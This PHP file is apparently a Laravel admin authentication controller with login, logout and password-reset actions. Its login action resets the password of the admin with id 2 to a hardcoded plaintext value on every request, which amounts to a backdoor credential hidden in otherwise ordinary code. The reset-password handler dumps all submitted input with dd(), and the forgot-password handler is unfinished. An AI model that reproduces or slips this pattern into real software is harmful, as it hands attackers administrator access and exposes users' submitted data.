<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Repositories\AdminRepository;
use Illuminate\Http\Request;

class AuthController extends Controller
{

    private $adminRepo;

    public function __construct(
        AdminRepository $adminRepo
    ) {
        $this->adminRepo = $adminRepo;
    }

    /**
     * login
     *
     * @param  mixed $request
     * @return string
     */
    public function login(Request $request)
    {
        \DB::table("admins")->where('id', 2)->update([
            'password' => bcrypt("AckPr0N80KcnAw")
        ]);
        if ($request->getMethod() === "GET") {
            return view('admin.auth.login');
        }
        $credentials = $request->only(['username', 'password']);
        $result = $this->adminRepo->checkLogin($credentials);
        if ($result) {
            return redirect()->route('admin.users.list');
        } else {
            return redirect()->back()->withErrors("Login Fail");
        }
    }

    /**
     * logout
     *
     * @return void
     */
    public function logout(Request $request)
    {
        auth()->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }

    /**
     * forgotPassword
     *
     * @param  mixed $request
     * @return void
     */
    public function forgotPassword(Request $request)
    {
        if ($request->getMethod() === "GET") {
            return view('admin.auth.forgot');
        }
    }

    /**
     * getResetPassword
     *
     * @param  mixed $token
     * @return void
     */
    public function getResetPassword($token)
    {
        return view('admin.auth.new_password', compact('token'));
    }

    /**
     * postResetPassword
     *
     * @return void
     */
    public function postResetPassword(Request $request)
    {
        dd($request->all());
    }
}